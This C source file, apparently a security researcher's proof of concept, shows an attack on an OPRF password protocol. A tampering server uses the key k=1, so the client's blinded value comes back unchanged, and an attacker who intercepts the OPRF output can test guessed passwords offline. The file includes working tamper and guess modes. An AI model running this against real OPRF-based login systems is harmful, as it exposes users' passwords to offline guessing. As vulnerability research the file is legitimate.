// # SPDX-FileCopyrightText: 2024, Marsiske Stefan
// # SPDX-License-Identifier: GPL-3.0-or-later

// build with
// $ gcc -Wall -O3 attack.c -o attack -loprf -lsodium
// then run:
// $ ./attack test

#include <string.h>  // memcmp
#include <stdio.h>   // f?printf
#include <stdint.h>  // uint8_t
#include <stdarg.h>  // va_list, va_start, va_end
#include <oprf/oprf.h>
#include <sodium.h>

static const uint8_t k[crypto_core_ristretto255_SCALARBYTES]  = {1};

void dump(const uint8_t *p, const size_t len, const char* msg, ...) {
  va_list args;
  va_start(args, msg);
  vfprintf(stderr,msg, args);
  va_end(args);
  fprintf(stderr,"\t");
  for(size_t i=0;i<len;i++)
    fprintf(stderr,"%02x", p[i]);
  fprintf(stderr,"\n");
}

static int usage(const char *exec, const int ret) {
  printf("usage: cat alpha | %s tamper >beta\n", exec);
  printf("usage: cat rwd | %s guess password\n", exec);
  return ret;
}

static int tamper(const uint8_t alpha[crypto_core_ristretto255_BYTES],
                  uint8_t beta[crypto_core_ristretto255_BYTES]) {
  puts("tampering");
  dump(k, sizeof k, "k");
  if(0!=crypto_scalarmult_ristretto255(beta, k, alpha)) {
    fputs("failed to tamper with k\nabort.\n", stderr);
    return 1;
  }
  return 0;
}

static int guess(uint8_t rwd[OPRF_BYTES], const uint8_t *pwd, const size_t pwd_len) {
  //fputs("[1] hashing to group...", stdout);
  uint8_t h0pwd[crypto_core_ristretto255_BYTES]={0};
  if(0!=voprf_hash_to_group(pwd, pwd_len, h0pwd)) {
    fputs("failed to hash to group\nabort\n", stderr);
    return 1;
  }

  // tamper(h0pwd, h0pwd)

  uint8_t rwd_[OPRF_BYTES];
  if(0!=oprf_Finalize(pwd, pwd_len, h0pwd, rwd_)) {
    fputs("failed to finalize OPRF\nabort\n", stderr);
    return 1;
  }

  if(memcmp(rwd,rwd_, OPRF_BYTES)!=0) return -1;

  return 0;
}

static int test(void) {
  // regular OPRF flow on the client
  const uint8_t password[] = "Exploitability of this is low, OPRFs are still cool";
  uint8_t alpha[crypto_core_ristretto255_BYTES]={0};
  uint8_t r[crypto_core_ristretto255_SCALARBYTES]={0};
  if(0!=oprf_Blind(password, sizeof password, r, alpha)) {
    fputs("failed to blind password\nabort\n", stderr);
    return 1;
  }
  //dump(r, sizeof r, "r");

  // we tamper with beta
  uint8_t beta[crypto_core_ristretto255_BYTES]={0};
  dump(alpha, sizeof alpha, "alpha");
  tamper(alpha, beta);
  dump(beta, sizeof beta, "beta");

  // regular OPRF flow on the client
  uint8_t N[crypto_core_ristretto255_BYTES]={0};
  int x = oprf_Unblind(r, beta, N);
  if(0!=x) {
    fputs("failed to unblind beta\nabort\n", stderr);
    return 1;
  }
  uint8_t rwd[OPRF_BYTES];
  if(0!=oprf_Finalize(password, sizeof password, N, rwd)) {
    fputs("failed to finalize OPRF\nabort\n", stderr);
    return 1;
  }

  // we "intercept" the oprf output and guess candidate inputs

  fprintf(stderr, "guess(\"%s\") = %d\n", password, guess(rwd, password, sizeof password-1));
  fprintf(stderr, "guess(\"%s\") = %d\n", password, guess(rwd, password, sizeof password));

  return 0;
}

int main(const int argc, const char** argv) {
  if(argc<2) {
    return usage(argv[0], 0);
  }
  if(memcmp(argv[1],"tamper",7)==0) {
    uint8_t alpha[crypto_core_ristretto255_BYTES];
    if(fread(alpha, 1, 32, stdin) != 32) {
      fputs("failed to read point\nabort.\n", stderr);
      return 1;
    }

    uint8_t beta[crypto_core_ristretto255_BYTES];
    if(0!=tamper(alpha, beta)) {
      return 1;
    };
    fwrite(beta, 1, sizeof beta, stdout);
    return 0;
  }
  if(memcmp(argv[1],"guess",6)==0) {
    if(argc<3) {
      return usage(argv[0], 1);
    }
    uint8_t rwd[OPRF_BYTES];
    if(fread(rwd, 1, OPRF_BYTES, stdin) != OPRF_BYTES) {
      fputs("failed to read rwd\nabort.\n", stderr);
      return 1;
    }
    return guess(rwd, (uint8_t*) argv[2], strlen(argv[2]));
  }
  if(memcmp(argv[1],"test",5)==0) {
    return test();
  }

  return usage(argv[0], 1);
}
